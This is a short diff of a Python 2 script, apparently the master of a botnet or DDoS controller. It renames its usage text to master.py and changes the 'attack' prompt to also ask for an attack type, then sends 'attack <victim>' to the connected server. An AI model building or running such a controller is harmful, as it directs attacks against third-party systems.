@@ -33,7 +33,7 @@ def receivemessage(socket):
 if __name__ == "__main__":
 
     if len(sys.argv) < 3:
-        print 'Usage : python telnet.py hostname port'
+        print 'Usage : python master.py hostname port'
         sys.exit()
 
     host = sys.argv[1]
@@ -63,7 +63,7 @@ if __name__ == "__main__":
                 receivemessage(s)
             #Start attack command
             elif option == "attack":
-                print "Insert victim ip and port: ",
+                print "Insert attack type, victim ip and port: ",
                 victim = str(raw_input())
                 s.send("attack " + victim)
                 status = "Attacking!"
